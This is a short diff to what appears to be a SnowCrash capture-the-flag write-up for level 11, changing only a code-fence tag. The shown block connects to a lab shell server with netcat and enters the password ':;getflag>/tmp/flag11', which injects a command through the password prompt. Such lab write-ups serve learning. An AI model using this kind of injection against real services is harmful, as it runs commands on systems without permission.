@@ -1,7 +1,7 @@
 # level11
 
 Weird shell server
-```bash
+```sh
 root@kali:~# nc SnowCrash 5151
 Password: :;getflag>/tmp/flag11
 root@kali:~# ssh level11@SnowCrash
